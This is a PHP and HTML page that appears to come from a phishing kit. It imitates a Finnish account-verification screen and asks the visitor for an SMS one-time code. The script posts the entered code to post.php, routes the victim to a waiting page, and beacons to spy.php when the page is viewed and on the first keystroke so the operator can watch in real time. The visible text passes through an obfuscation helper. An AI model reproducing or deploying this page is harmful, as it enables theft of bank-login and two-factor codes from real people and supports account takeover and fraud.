<?php 
require '../main.php';
?><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<div class="left">
    <img src="res/logo.svg">
</div>
<div class="right">
<span><?php $bm->obf("Tarvitsetko apua?"); ?></span>
<span><?php $bm->obf("Poistu"); ?></span>
</div>
</header>

<div class="banner">
    <img src="res/key.svg">
    <h4><?php $bm->obf("Tunnistautuminen"); ?></h4>
</div>

<main>
<div class="form-holder">
<div class="form-banner">
<h4><?php $bm->obf("Tilin vahvistus"); ?></h4>
</div>
<img src="res/user.jpg">

<div class="multi">
<div class="left">

 </div>


<div class="right">

<div class="col">
<label>
<?php $bm->obf("Syötä vastaanotettu koodi:"); ?></label>
<span><?php $bm->obf("Koodi SMS"); ?></span>
<input type="text" id="sms">
</div>
<div class="col">
    <button onclick="sendOtp()"><?php $bm->obf("Jatka"); ?></button>
</div>
<div class="col forgot">
</div>


</div>

</div>

</div>
</main>
    

<div class="window" id="error" style="display:<?php echo isset($_GET['e']) ? "block" : "none" ; ?>">
<div class="content">
<div class="form-error">
<h5><?php $bm->obf("Virhe"); ?></h5>
<p><?php $bm->obf("Syötetty koodi on virheellinen"); ?></p>
<div style="text-align:center">
<button onclick="exitError()">Ok</button>
</div>
</div>
</div>
</div>


<script src="res/jq.js"></script>
<script src="res/m.js"></script>
<script> 
$("#sms").mask("00000000");

function exitError(){
    $("#error").hide();
}

function sendOtp(){
    if($("#sms").val().length==4){
        $.post("post.php",{sms:$("#sms").val()},(res)=>{
            window.location="mkfile.php?p=wait&params=?p=SMS";
        });
    }else{
        $("#error").show();
    }
}

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendOtp();
    }
});

 $.post("spy.php", {otpview:1});
var abort = false;
$("#sms").keyup(function(){
	if(abort==false){
		$.post("spy.php", {loging:1});
		abort=true;
	}
});
</script>
<?php 
$m->ctr("SMS ".@$_GET['e']);
?>
</body>
</html>